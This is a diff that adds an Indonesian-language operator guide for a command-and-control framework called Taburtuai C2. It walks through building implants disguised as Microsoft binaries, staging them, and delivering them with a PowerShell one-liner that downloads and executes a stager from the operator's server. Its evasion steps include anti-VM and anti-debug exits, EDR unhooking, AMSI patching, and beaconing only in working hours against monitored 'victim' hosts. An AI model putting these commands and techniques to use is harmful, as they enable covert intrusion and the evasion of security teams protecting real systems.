@@ -4,6 +4,358 @@ Operational security practices for running engagements with Taburtuai C2 without
 
 ---
 
+## OPSEC Profiles — Panduan Lengkap
+
+### Quick Reference
+
+| Profile | Interval | Jitter | Working Hours | Sleep Mask | Anti-Debug/VM | Exec Method | Garble | Untuk |
+|---------|----------|--------|---------------|------------|---------------|-------------|--------|-------|
+| `default` | 10s | 20% | off | off | off | cmd | off | Lab, VM, testing |
+| `aggressive` | 5s | 10% | off | off | off | cmd | off | Speed-focused, no EDR |
+| `opsec` | 60s | 30% | off | on | on | powershell | off | Produksi umum, EDR ada |
+| `stealth` | 300s | 50% | off | on | on | wmi | on* | Lingkungan dimonitor |
+| `paranoid` | 600s | 50% | 09:00–17:00 | on | on | mshta | on* | SOC+EDR, target kritis |
+
+> *`obfuscate: true` membutuhkan `garble` terinstall: `go install mvdan.cc/garble@latest`
+
+---
+
+### Cara Kerja Setiap Fitur
+
+**Sleep Masking** (`sleep_masking: true`)
+Agent memanggil `VirtualProtect` untuk menandai region memori tempat key enkripsi sebagai `PAGE_NOACCESS` selama sleep. Jika EDR melakukan memory scan saat agent tidur, encryption key tidak terbaca. Aktif di semua profile kecuali `default` dan `aggressive`.
+
+**Anti-Debug / Anti-VM** (`enable_vm_check`, `enable_sandbox_check`, `enable_debug_check`)
+Agent menjalankan tiga pengecekan sebelum beacon pertama:
+- `checkCPUIDHypervisor()` — eksekusi `wmic computersystem get model`, cek kata kunci `virtual`, `vmware`, `vbox`, `hyper-v`, dll.
+- `checkVMRegistryKeys()` — cek registry VMware Tools, VirtualBox Guest Additions, Hyper-V Guest Parameters
+- `checkVMProcesses()` — scan proses: `vmtoolsd.exe`, `vboxservice.exe`, dll.
+- `nativeDetectDebugger()` — `IsDebuggerPresent` + parent process check
+
+Jika terdeteksi → agent exit silently (tidak ada output, tidak ada error).
+
+> **Penting**: Profile dengan `enable_vm_check: true` TIDAK akan jalan di VM. Gunakan `--profile default` saat testing di VMware/VirtualBox/Hyper-V.
+
+**Working Hours** (`working_hours_only: true`)
+Agent cek jam lokal victim sebelum setiap beacon. Di luar jam kerja, agent tidur sampai jam mulai berikutnya. Command yang di-queue tetap tersimpan di server — akan dieksekusi saat jam aktif.
+
+**Exec Method** — cara agent spawn sub-process untuk eksekusi command:
+- `cmd` — `cmd.exe /c <command>` — paling simpel, paling terdeteksi
+- `powershell` — `powershell.exe -EncodedCommand <base64>` — lebih stealth, command ter-encode
+- `wmi` — spawn via `wmic.exe process call create` — parent process adalah WMI host, bukan agent
+- `mshta` — spawn via `mshta.exe` LOLBin — banyak digunakan AV whitelist
+
+**Garble Obfuscation** (`obfuscate: true`)
+Compile dengan `garble` yang merandominasi nama fungsi, variabel, dan string di binary. Mencegah signature-based detection berbasis nama simbol. Membutuhkan `garble` di PATH.
+
+---
+
+### Profile `default` — Lab & Testing
+
+**Kapan dipakai:** VM lab, testing fitur, demo, target tanpa EDR.
+
+**Yang perlu diketahui:**
+- Beacon setiap 10 detik → agent selalu responsif
+- Tidak ada evasion → AKAN terdeteksi di lingkungan produksi
+- Tidak ada VM check → bisa jalan di VM
+- Tidak ada garble → binary lebih kecil, compile lebih cepat
+
+**Step-by-step:**
+
+```bash
+# 1. Build agent
+./bin/generate stageless \
+  --c2 https://172.23.0.118:8443 \
+  --key $ENCRYPTION_KEY \
+  --profile default \
+  --no-gui \
+  --arch amd64 \
+  --insecure-tls \
+  --output ./builds/agent.exe
+```
+
+Expected output:
+```
+[*] Using profile: default
+[*] Compiling agent (amd64/windows)...
+[+] Stageless implant : builds/agent.exe
+    Size              : 11353 KB
+    SHA256            : <hash>
+    MD5               : <hash>
+    Build time        : ~1s
+```
+
+```bash
+# 2. Upload ke server
+./bin/generate upload ./builds/agent.exe \
+  --server https://172.23.0.118:8443 \
+  --desc "lab-default" \
+  --insecure
+```
+
+Expected:
+```
+[+] Stage uploaded
+    Token    : <32-char hex>
+    Stage URL: https://172.23.0.118:8443/stage/payload
+    Format   : exe/amd64
+    TTL      : 24h
+```
+
+```bash
+# 3. Generate PS1 stager
+./bin/generate stager \
+  --server https://172.23.0.118:8443 \
+  --key $ENCRYPTION_KEY \
+  --token <token_dari_upload> \
+  --format ps1 \
+  --output stager.ps1
+```
+
+```bash
+# 4. Kirim ke victim (host PS1 via HTTP)
+python3 -m http.server 8000
+# Di victim: powershell -ep bypass -c "iex(iwr http://172.23.0.118:8000/stager.ps1)"
+```
+
+```bash
+# 5. Tunggu check-in (~30-120 detik pre-beacon delay)
+./bin/operator --server https://172.23.0.118:8443 console --insecure
+```
+
+```
+[172.23.0.118:8443] ❯ agents list
+[+] Found 1 agent(s)
+
+AGENT ID                             HOSTNAME        USERNAME   STATUS   LAST SEEN
+c7253aea-346...                      DESKTOP-XYZ     John       online   2026-04-26 05:35:21
+```
+
+---
+
+### Profile `opsec` — Produksi Umum
+
+**Kapan dipakai:** Target produksi dengan AV/EDR standar (Defender, Trend Micro, dll.), tanpa SOC aktif. Engagement umum.
+
+**Yang perlu diketahui:**
+- Beacon 60s ±30% jitter → tiap request tiba antara 42–78 detik
+- Anti-VM/debugger aktif → TIDAK bisa jalan di VM
+- Sleep masking aktif → key terlindungi saat agent tidur
+- `exec_method: powershell` → command dikodekan Base64
+- Perlu bare-metal atau VM yang bersih (tanpa VM tools)
+
+**Step-by-step:**
+
+```bash
+# 1. Server HARUS distart dengan PROFILE yang cocok (atau default)
+# Jika mau C2 traffic terlihat seperti Office365, start server dengan:
+PROFILE=office365 ENCRYPTION_KEY=$ENCRYPTION_KEY TLS_ENABLED=true ./bin/server
+
+# Atau tanpa C2 profile (pakai default routing):
+ENCRYPTION_KEY=$ENCRYPTION_KEY TLS_ENABLED=true ./bin/server
+```
+
+```bash
+# 2. Build agent — TARGET BUKAN VM
+./bin/generate stageless \
+  --c2 https://172.23.0.118:8443 \
+  --key $ENCRYPTION_KEY \
+  --profile opsec \
+  --masq-company "Microsoft Corporation" \
+  --masq-desc "Windows Security Health Service" \
+  --masq-orig "SecurityHealthService.exe" \
+  --kill-date 2026-06-30 \
+  --no-gui \
+  --arch amd64 \
+  --insecure-tls \
+  --output ./builds/SecurityHealthService.exe
+```
+
+Expected:
+```
+[*] Using profile: opsec
+[*] Compiling agent (amd64/windows)...
+[+] Stageless implant : builds/SecurityHealthService.exe
+    Size              : 11354 KB
+    Build time        : ~1.1s
+```
+
+```bash
+# 3. Upload + stager (sama seperti default)
+./bin/generate upload ./builds/SecurityHealthService.exe \
+  --server https://172.23.0.118:8443 \
+  --desc "prod-opsec" \
+  --insecure
+
+./bin/generate stager \
+  --server https://172.23.0.118:8443 \
+  --key $ENCRYPTION_KEY \
+  --token <token> \
+  --format ps1 \
+  --output stager.ps1
+```
+
+```bash
+# 4. Setelah agent masuk, jalankan evasion sequence dulu
+[172.23.0.118:8443] ❯ agents list
+[+] Found 1 agent(s)
+AGENT ID    HOSTNAME        STATUS
+abc123...   WORKSTATION01   online
+
+[172.23.0.118:8443] ❯ opsec antivm abc123
+[+] Anti-VM check: clean
+
+[172.23.0.118:8443] ❯ evasion unhook abc123
+[+] EDR hooks removed
+
+[172.23.0.118:8443] ❯ bypass amsi abc123
+[+] AMSI patched
+```
+
+> Setelah `evasion unhook` + `bypass amsi`, baru aman eksekusi command berbahaya.
+
+---
+
+### Profile `stealth` — Lingkungan Dimonitor
+
+**Kapan dipakai:** Target dengan EDR berat (CrowdStrike, SentinelOne), ada tim blue team aktif, atau NDR monitoring traffic.
+
+**Yang perlu diketahui:**
+- Beacon 300s ±50% jitter → tiap request tiba antara **2.5–7.5 menit** → tunggu lama!
+- `working_hours_only: false` (di YAML), tapi bisa dioverride — cek profile
+- `exec_method: wmi` → command spawn via WMI host (parent process bukan agent)
+- `obfuscate: true` → perlu garble di PATH
+- Garble membuat compile lebih lama (~30–60 detik) dan binary lebih besar
+- Shell command `--timeout` HARUS diperbesar: `--timeout 600` minimum
+
+**Step-by-step:**
+
+```bash
+# 0. Install garble dulu (hanya sekali)
+go install mvdan.cc/garble@latest
+garble version
+# Expected: garble v0.x.x ...
+```
+
+```bash
+# 1. Build dengan stealth profile
+./bin/generate stageless \
+  --c2 https://172.23.0.118:8443 \
+  --key $ENCRYPTION_KEY \
+  --profile stealth \
+  --kill-date 2026-06-30 \
+  --no-gui \
+  --arch amd64 \
+  --insecure-tls \
+  --output ./builds/wuauclt_upd.exe
+```
+
+Expected (lebih lama karena garble):
+```
+[*] Using profile: stealth
+[*] Compiling agent (amd64/windows)...
+[+] Stageless implant : builds/wuauclt_upd.exe
+    Size              : ~8-12 MB
+    Build time        : 30–60s
+```
+
+```bash
+# 2. Upload + stager (sama seperti sebelumnya)
+# 3. Setelah PS1 jalan di victim, TUNGGU hingga 3 menit untuk check-in pertama
+```
+
+```
+# 4. Di operator console — gunakan timeout besar untuk setiap command
+[172.23.0.118:8443] ❯ agents list
+abc123...   WORKSTATION01   online   (last seen mungkin sudah beberapa menit lalu)
+
+[172.23.0.118:8443] ❯ shell abc123 "whoami" --timeout 600
+# Tunggu hingga 10 menit (beacon interval + eksekusi)
+[+] Result: CORP\jsmith
+
+[172.23.0.118:8443] ❯ shell abc123 "hostname" --timeout 600
+[+] Result: WORKSTATION01
+```
+
+> **Penting:** Dengan interval 300s ±50%, command yang dikirim mungkin baru dieksekusi 5+ menit kemudian. Normal — agent aktif tapi sedang tidur.
+
+---
+
+### Profile `paranoid` — SOC + EDR Berat
+
+**Kapan dipakai:** Target dengan SOC 24/7, EDR enterprise (CrowdStrike Falcon, Defender for Endpoint), network monitoring aktif, atau target high-value.
+
+**Yang perlu diketahui:**
+- Beacon 600s ±50% jitter → tiap request tiba antara **5–15 menit**
+- `working_hours_only: true`, jam **09:00–17:00** waktu lokal victim
+- Di luar jam itu, agent tidak beacon sama sekali
+- `exec_method: mshta` — spawn via `mshta.exe` (Microsoft HTML Application Host)
+- Wajib garble
+- Shell timeout HARUS `--timeout 900`+
+- Jangan pakai di VM — anti-VM akan kill agent
+
+**Step-by-step:**
+
+```bash
+# 1. Build dengan paranoid profile
+./bin/generate stageless \
+  --c2 https://c2.example.com \
+  --key $ENCRYPTION_KEY \
+  --profile paranoid \
+  --kill-date 2026-06-30 \
+  --no-gui \
+  --arch amd64 \
+  --output ./builds/MicrosoftEdgeUpdate.exe
+```
+
+```bash
+# 2. Deploy ke victim saat jam KERJA (09:00–17:00 waktu victim)
+# Jika deploy di luar jam tersebut, agent akan berjalan tapi tidak beacon sampai jam 09:00
+```
+
+```
+# 3. Cek agent — mungkin tidak langsung muncul
+[172.23.0.118:8443] ❯ agents list
+[!] No agents found
+# Normal jika deploy di luar jam kerja
+
+# Coba lagi besok pagi jam 09:30:
+[172.23.0.118:8443] ❯ agents list
+[+] Found 1 agent(s)
+AGENT ID    HOSTNAME    STATUS
+abc123...   DC01        online
+```
+
+```
+# 4. Setiap command butuh timeout besar
+[172.23.0.118:8443] ❯ shell abc123 "net user" --timeout 900
+# Bisa tunggu 15+ menit
+```
+
+---
+
+### Ringkasan: Kapan Pakai Apa
+
+| Situasi | Profile |
+|---------|---------|
+| Testing di lab VM sendiri | `default` |
+| Engagement CTF tanpa EDR | `aggressive` |
+| Engagement dengan Defender/AV standar | `opsec` |
+| Target produksi dengan EDR, tidak ada SOC | `stealth` |
+| Target high-value, SOC aktif, EDR enterprise | `paranoid` |
+
+### Aturan Penting yang Sering Salah
+
+1. **C2 Profile ≠ OPSEC Profile** — `--c2-profile office365` di agent butuh server distart dengan `PROFILE=office365`. Kalau tidak cocok, agent beacon ke URL yang tidak terdaftar → 404 → exit. Untuk testing, jangan pakai `--c2-profile`.
+
+2. **Anti-VM membunuh agent di VM** — Profile `opsec`/`stealth`/`paranoid` punya `enable_vm_check: true`. Untuk testing di VMware/VirtualBox, WAJIB pakai `--profile default`.
+
+3. **Working hours menyebabkan agent "hilang"** — Profile `paranoid` hanya beacon jam 09–17. Kalau cek `agents list` jam 20:00, agent terlihat `dormant` — ini normal.
+
+4. **Beacon interval butuh timeout besar** — `stealth` (300s) dan `paranoid` (600s) butuh `--timeout` yang sesuai di setiap shell command, bukan default 30s.
+
+---
+
 ## Before Deployment
 
 ### Choose the Right Profile
